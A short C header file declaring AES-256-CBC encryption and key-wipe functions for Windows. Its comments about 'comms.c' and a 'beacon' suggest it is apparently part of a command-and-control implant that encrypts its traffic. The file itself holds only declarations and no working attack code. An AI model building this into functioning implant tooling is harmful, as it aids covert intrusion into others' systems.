#ifndef CRYPTO_H
#define CRYPTO_H
#include "common.h"

#pragma comment(lib, "bcrypt.lib")

#define KEYSIZE 32 // AES-256
#define IVSIZE 16  // CBC IV

typedef struct _AES {
  PBYTE pKey;
  PBYTE pIv;
  PBYTE pPlainText; // input for encrypt / output for decrypt
  DWORD dwPlainSize;
  PBYTE pCipherText; // output for encrypt / input for decrypt
  DWORD dwCipherSize;
} AES, *PAES;

// Public API — only these two are called from comms.c
BOOL aes_encrypt_payload(PBYTE plain, DWORD plainLen, PVOID *outCipher,
                         DWORD *outLen);
BOOL aes_decrypt_payload(PBYTE cipher, DWORD cipherLen, PVOID *outPlain,
                         DWORD *outLen);

// Key wipe — call before beacon exits
VOID crypto_wipe_keys(VOID);

#endif /* CRYPTO_H */